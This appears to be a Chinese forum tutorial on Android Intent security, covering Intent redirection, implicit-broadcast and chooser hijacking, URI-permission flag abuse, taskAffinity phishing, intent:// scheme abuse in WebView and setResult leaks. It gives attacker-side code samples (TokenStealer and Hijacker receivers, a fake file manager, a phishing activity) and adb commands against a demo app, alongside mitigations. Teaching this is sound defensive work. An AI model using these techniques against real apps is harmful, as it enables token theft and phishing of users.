# Android移动安全第二章_Intent安全
> QIANXIN Team
> 来源：https://forum.butian.net/share/4825

> 系列目录：
> 
> 1.  Android 组件导出安全
> 2.  Android Intent 安全（本章）
> 3.  Android Binder 服务安全
> 4.  Android ContentProvider 安全
> 5.  Android WebView 安全
> 6.  Android UI 欺骗与钓鱼
> 7.  Android Deep Link 安全
> 8.  Android 广播安全
> 9.  Android PendingIntent 安全
> 10.  Android 系统设置安全
> 11.  Android SSRF 与网络安全
> 12.  Android 加密与数据存储安全
> 13.  Android 认证与证书校验
> 14.  Android Zip Slip 路径遍历
> 15.  Android Fragment Injection
> 16.  Android SELinux 与沙箱机制

* * *

## 1\. 前言

在 Android 中，组件之间不能直接调用彼此的方法。它们通过 Intent（意图）来通信——一个组件创建一个 Intent 对象，描述"我想做什么"或"我想启动谁"，然后交给系统去分发。

上一章我们看到，导出的组件可以被外部访问。但"访问"这个动作本身，就是通过 Intent 完成的。攻击者构造一个恶意 Intent 发给目标组件，组件收到后如果不加校验地处理其中的数据，漏洞就产生了。

Intent 相关的安全问题可以分为三个方向：

-   攻击者向受害 App 发送恶意 Intent（注入）
-   受害 App 发出的 Intent 被攻击者截获（泄露）
-   受害 App 把攻击者提供的 Intent 当作自己的去执行（重定向）

本章逐一展开。

* * *

## 2\. Intent 基础

### 2.1 显式 Intent 与隐式 Intent

Intent 分为两种：

显式 Intent 明确指定了目标组件的包名和类名，系统直接将它发送给指定组件：

```java

Intent intent = new Intent();
intent.setClassName("com.target.app", "com.target.app.PaymentActivity");
startActivity(intent);
```

隐式 Intent 不指定具体组件，而是描述一个动作（action），由系统根据已安装 App 的 intent-filter 匹配合适的组件来处理：

```java

Intent intent = new Intent("android.intent.action.VIEW");
intent.setData(Uri.parse("https://example.com"));
startActivity(intent);
```

从安全角度看，这两种 Intent 的风险方向不同：

| 类型 | 风险方向 | 原因 |
| --- | --- | --- |
| 显式 Intent | 注入风险 | 攻击者可以构造显式 Intent 直接发给导出组件 |
| 隐式 Intent | 泄露风险 | 任何 App 都可以注册匹配的 intent-filter 来拦截 |

### 2.2 Intent 的数据承载

一个 Intent 可以携带多种数据，这些数据都是攻击者在构造恶意 Intent 时可以控制的：

| 字段 | 说明 | 示例 |
| --- | --- | --- |
| action | 动作标识符 | android.intent.action.VIEW |
| data | URI 数据 | content://contacts/1 |
| type | MIME 类型 | image/png |
| category | 类别标签 | android.intent.category.DEFAULT |
| extras | 键值对附加数据 | putExtra("url", "https://evil.com") |
| flags | 控制标志位 | FLAG_GRANT_READ_URI_PERMISSION |
| component | 目标组件 | com.app/.Activity |

其中 extras 是最常被利用的，因为它可以携带任意类型的数据（字符串、整数、数组、甚至另一个 Intent 对象），而且很多开发者会直接从 extras 中取值使用，不做校验。

### 2.3 Intent 的传递路径

理解 Intent 的传递路径有助于分析攻击面：

![intent_flow.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-7c63a3bb99c43ce8dbc79b3241faf70a175b1771.png)

系统在中间做的权限检查主要是：接收方组件是否导出、发送方是否持有所需权限。但系统不会检查 Intent 中携带的数据内容是否安全——这完全是接收方自己的责任。

* * *

## 3\. Intent 重定向（LaunchAnywhere）

### 3.1 原理

Intent 重定向是 Android 客户端漏洞中影响比较大的一类。它的核心模式是：

1.  受害 App 的某个导出组件接收外部 Intent
2.  从这个 Intent 的 extras 中取出一个嵌套的 Intent 对象（或用于构造 Intent 的参数）
3.  用取出的 Intent 调用 startActivity() / startService() / sendBroadcast()

问题在于第 3 步：受害 App 是用自己的身份去执行这个 Intent 的。如果受害 App 是系统应用（UID 1000），那攻击者就相当于借用了系统权限去启动任意组件，包括那些未导出的、受权限保护的组件。

这就是"LaunchAnywhere"这个名字的由来——借助受害 App 的身份，启动任何地方的任何组件。

### 3.2 三种常见变体

#### 变体 1：直接转发嵌套 Intent

最经典的模式。从 extras 中取出一个 Parcelable 类型的 Intent 对象，直接 startActivity：

```java

Intent next = getIntent().getParcelableExtra("next_intent");
if (next != null) {
    startActivity(next);  
}
```

攻击者构造：

```java

Intent inner = new Intent();
inner.setClassName("com.victim.app", "com.victim.app.InternalActivity");

Intent outer = new Intent();
outer.setClassName("com.victim.app", "com.victim.app.VulnActivity");
outer.putExtra("next_intent", inner);
startActivity(outer);
```

#### 变体 2：从字符串参数构造 Intent

不直接传 Intent 对象，而是传组件名的字符串，由受害 App 自己构造 Intent：

```java

String pkg = getIntent().getStringExtra("target_package");
String cls = getIntent().getStringExtra("target_class");
if (pkg != null && cls != null) {
    Intent redirect = new Intent();
    redirect.setClassName(pkg, cls);
    startActivity(redirect);
}
```

这种变体在 ADB 测试时更方便，因为 `am start` 命令可以直接传字符串参数，但不方便传 Parcelable 对象。

演示 App 中的 VulnProxyActivity 同时支持变体 1 和变体 2。通过 ADB 用字符串参数启动未导出的 InternalTokenActivity：

```bash
adb shell am start -n com.demo.intentsecurity/.VulnProxyActivity \
    --es target_package "com.demo.intentsecurity" \
    --es target_class "com.demo.intentsecurity.InternalTokenActivity"
```

成功绕过 exported=false 限制，打开了内部 Token 管理页面：

![demo2_intent_scheme_result.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-366eedb1cb7b2a889c483d09a1280ac875959a90.png)

#### 变体 3：IntentSender / PendingIntent 中继

有些场景下，受害 App 不是直接 startActivity，而是通过 IntentSender 或 PendingIntent 间接执行。这种模式在系统服务中比较常见：

```java

IntentSender sender = intent.getParcelableExtra("intent_sender");
if (sender != null) {
    sender.sendIntent(context, 0, null, null, null);
}
```

### 3.3 Android 12+ 的缓解措施

从 Android 12 开始，系统对嵌套 Intent 做了一些限制：

-   如果一个 Intent 是从另一个 Intent 的 extras 中取出的，且目标组件未导出，系统会阻止启动并抛出异常
-   具体来说，`startActivity()` 会检查调用者是否有权限访问目标组件，而不是简单地信任调用者的 UID

但这个缓解不是万能的：

-   只对 startActivity 有效，sendBroadcast 和 startService 的限制较弱
-   如果目标组件本身是导出的，这个检查不起作用
-   系统应用（UID 1000）的调用仍然可以绕过部分限制

* * *

## 4\. 隐式 Intent 信息泄露

### 4.1 原理

当 App 使用隐式 Intent 发送数据时，系统会在所有已安装 App 中匹配合适的接收者。如果攻击者的 App 注册了匹配的 intent-filter，就能截获这个 Intent 中携带的数据。

```java

Intent intent = new Intent("com.victim.app.ACTION_SHARE_TOKEN");
intent.putExtra("auth_token", "eyJhbGciOiJIUzI1NiJ9...");
sendBroadcast(intent);  
```

攻击者只需注册一个匹配的 Receiver：

```xml

<receiver android:name=".TokenStealer" android:exported="true">
    <intent-filter>
        <action android:name="com.victim.app.ACTION_SHARE_TOKEN" />
    </intent-filter>
</receiver>
```

这个问题不限于广播。隐式 Intent 启动 Activity 时，如果有多个 App 匹配，系统会弹出选择器让用户选——但用户可能会选择攻击者的 App。隐式 Intent 启动 Service 在 Android 5.0+ 已被禁止，但广播仍然可以。

演示 App 中的 LeakySenderActivity 展示了这个问题。启动后它会通过隐式广播发送模拟的 auth token：

```bash
adb shell am start -n com.demo.intentsecurity/.LeakySenderActivity
```

![demo2_implicit_leak.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-15c861c3b8e2519fa4ba5e32604b1be39f61dfee.png)

页面上可以看到广播的 action 和携带的 token 数据。任何注册了 `com.demo.intentsecurity.ACTION_TOKEN_UPDATE` 的 App 都能收到这条广播。

### 4.2 有序广播的劫持

有序广播（Ordered Broadcast）是一种按优先级依次分发的广播。接收者可以修改广播内容，甚至终止广播的继续传递。

```java

sendOrderedBroadcast(intent, null);
```

攻击者注册一个高优先级的 Receiver：

```xml
<receiver android:name=".Hijacker" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.victim.app.ACTION_VERIFY" />
    </intent-filter>
</receiver>
```

```java

public class Hijacker extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        
        String code = intent.getStringExtra("verification_code");
        Log.d("Hijacker", "Got code: " + code);

        
        abortBroadcast();
    }
}
```

优先级值（priority）范围是 -1000 到 1000，值越大越先收到。攻击者设置 999 就能抢在大多数合法 Receiver 之前处理广播。

### 4.3 Activity 选择器劫持

当隐式 Intent 匹配到多个 Activity 时，系统弹出选择器（Chooser）。攻击者可以注册一个看起来像合法应用的 Activity 来欺骗用户选择：

```xml

<activity
    android:name=".FakeFileManager"
    android:label="文件管理器"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.GET_CONTENT" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="*/*" />
    </intent-filter>
</activity>
```

用户在选择器中看到"文件管理器"，可能会点击它，然后攻击者的 Activity 就获得了原本应该由合法应用处理的数据。

* * *

## 5\. Intent Flag 滥用

### 5.1 FLAG\_GRANT\_READ\_URI\_PERMISSION

这个 flag 允许 Intent 的接收方临时获得对指定 URI 的读取权限，即使接收方没有对应的 ContentProvider 权限。

正常用途是文件分享：App A 把自己 ContentProvider 中的文件 URI 通过 Intent 发给 App B，同时带上这个 flag，App B 就能临时读取这个文件。

但如果受害 App 的导出组件存在 Intent 重定向漏洞，攻击者可以构造一个带有 `FLAG_GRANT_READ_URI_PERMISSION` 的 Intent，让受害 App 把自己 ContentProvider 的数据"授权"给攻击者：

```java

Intent inner = new Intent();
inner.setData(Uri.parse("content://com.victim.app.provider/private_data"));
inner.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
inner.setClassName("com.attacker.app", "com.attacker.app.ReceiverActivity");


Intent outer = new Intent();
outer.setClassName("com.victim.app", "com.victim.app.VulnRedirectActivity");
outer.putExtra("next_intent", inner);
startActivity(outer);
```

受害 App 执行 `startActivity(inner)` 时，系统认为是受害 App 主动授权，攻击者的 ReceiverActivity 就获得了读取 `content://com.victim.app.provider/private_data` 的权限。

### 5.2 FLAG\_ACTIVITY\_NEW\_TASK 与任务栈劫持

Android 的 Activity 是按"任务栈"（Task）组织的。每个任务栈是一组 Activity 的堆叠，用户按返回键时从栈顶依次弹出。

`FLAG_ACTIVITY_NEW_TASK` 会让目标 Activity 在一个新的任务栈中启动。配合 `taskAffinity`（任务栈亲和性，决定 Activity 属于哪个任务栈）属性，攻击者可以把自己的 Activity 插入到受害 App 的任务栈中：

```xml

<activity
    android:name=".PhishingActivity"
    android:taskAffinity="com.victim.app"
    android:exported="true" />
```

```java

Intent intent = new Intent(this, PhishingActivity.class);
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(intent);
```

当用户切换到受害 App 时，看到的可能是攻击者的钓鱼页面，因为它在同一个任务栈的栈顶。

### 5.3 其他值得关注的 Flag

| Flag | 作用 | 安全影响 |
| --- | --- | --- |
| FLAG_GRANT_WRITE_URI_PERMISSION | 临时授予 URI 写权限 | 配合重定向可写入受害 App 数据 |
| FLAG_GRANT_PERSISTABLE_URI_PERMISSION | 持久化 URI 权限授予 | 权限不会在 Activity 结束后撤销 |
| FLAG_ACTIVITY_CLEAR_TASK | 清空目标任务栈 | 可清除受害 App 的 Activity 历史 |
| FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | 从最近任务列表隐藏 | 隐藏攻击痕迹 |

* * *

## 6\. Intent Scheme URL

### 6.1 什么是 Intent Scheme URL

Android 支持一种特殊的 URL 格式，可以直接编码一个 Intent：

```php
intent:
```

这个 URL 可以通过 `Intent.parseUri()` 解析成一个 Intent 对象。如果 App 的 WebView 或 Deep Link 处理逻辑中使用了 `Intent.parseUri()` 且没有做过滤，攻击者就能通过一个 URL 触发任意 Intent。

### 6.2 解析过程

```java

Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
startActivity(intent);
```

这段代码的问题在于：URL 中可以编码 Intent 的几乎所有字段，包括 component、action、data、extras、flags。攻击者可以精确控制最终生成的 Intent。

### 6.3 常见的不安全处理

```java

@Override
public boolean shouldOverrideUrlLoading(WebView view, String url) {
    if (url.startsWith("intent://")) {
        Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
        startActivity(intent);  
        return true;
    }
    return false;
}
```

安全的做法是在解析后移除敏感字段：

```java
if (url.startsWith("intent://")) {
    Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
    
    intent.setComponent(null);
    
    intent.removeFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
    intent.removeFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
    
    intent.addCategory(Intent.CATEGORY_BROWSABLE);
    startActivity(intent);
}
```

演示 App 中的 VulnWebViewActivity 加载了一个内置页面，其中包含一个 intent:// 链接。也可以通过 ADB 直接传入 intent:// URL：

```bash
adb shell am start -n com.demo.intentsecurity/.VulnWebViewActivity \
    --es url "intent://dummy#Intent;component=com.demo.intentsecurity/.InternalTokenActivity;end"
```

WebView 拦截到 intent:// URL 后直接解析执行，成功启动了未导出的 InternalTokenActivity。内置演示页面如下：

![demo2_intent_scheme.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-6844bea164b498189ff5ad2fd71988a05049bc8c.png)

点击链接后，WebView 解析 intent:// URL 并启动了内部 Token 页面：

![demo2_intent_scheme_result.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-32f344f54ccefd06a56b799dec4708045aff98eb.png)

* * *

## 7\. setResult 数据回传泄露

### 7.1 原理

当 Activity A 通过 `startActivityForResult()` 启动 Activity B 时，B 可以通过 `setResult()` 把数据回传给 A。

如果 B 是一个导出的 Activity，攻击者可以直接用 `startActivityForResult()` 启动它，然后在 `onActivityResult()` 中接收 B 回传的数据：

```java

public class TokenActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Intent result = new Intent();
        result.putExtra("token", generateAuthToken());
        setResult(RESULT_OK, result);
        finish();
    }
}
```

```java

Intent intent = new Intent();
intent.setClassName("com.victim.app", "com.victim.app.TokenActivity");
startActivityForResult(intent, 1);

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    if (data != null) {
        String token = data.getStringExtra("token");
        
    }
}
```

### 7.2 容易忽略的场景

有些 Activity 不是在 onCreate 中直接 setResult，而是在用户操作后回传数据。比如一个文件选择器 Activity，用户选择文件后通过 setResult 返回文件 URI。如果这个 Activity 是导出的，攻击者可以启动它，等用户选择文件后获得文件 URI。

另一个场景是 Activity 在 finish 之前无条件调用 setResult。开发者可能认为"只有我自己的 App 会调用这个 Activity"，但如果它是导出的，任何 App 都可以调用并获取返回数据。

演示 App 中的 VulnResultActivity 就是这种模式。启动后立即生成 token 并通过 setResult 回传，然后 finish：

```bash
adb shell am start -n com.demo.intentsecurity/.VulnResultActivity
adb logcat -s VulnResult
```

输出：

```php
I VulnResult: Generated token: auth_1771677297791_secret
I VulnResult: Token set in result, finishing. Any caller gets this data.
```

虽然 ADB 无法直接接收 setResult 的数据，但任何通过 `startActivityForResult()` 启动它的 App 都能在 `onActivityResult()` 中拿到 token、user\_role、session\_id 等敏感信息。

* * *

## 8\. 总结

Intent 是 Android 组件通信的核心，也是攻击者与目标 App 交互的主要手段。

回顾一下本章的几个方向：

-   Intent 重定向（LaunchAnywhere）：借用受害 App 身份启动任意组件，Android 12+ 有缓解但不完全
-   隐式 Intent 泄露：广播、Activity 选择器都可能被攻击者截获
-   Flag 滥用：FLAG\_GRANT\_READ\_URI\_PERMISSION 配合重定向可以窃取 ContentProvider 数据
-   Intent Scheme URL：WebView 中解析 intent:// URL 可能触发任意 Intent
-   setResult 回传泄露：导出的 Activity 可能把敏感数据回传给攻击者

下一章讲 Android Binder 服务安全。Binder 是 Android IPC 的底层实现，系统服务、AIDL 接口都建立在它之上。我们会分析 Binder 的通信机制、系统服务的攻击面，以及 transaction code 调用的具体方法。

通过网盘分享的文件：intent.apk  
链接: [https://pan.baidu.com/s/19I4aWSMkLLNVw3y5tye34Q?pwd=iqgs](https://pan.baidu.com/s/19I4aWSMkLLNVw3y5tye34Q?pwd=iqgs) 提取码: iqgs
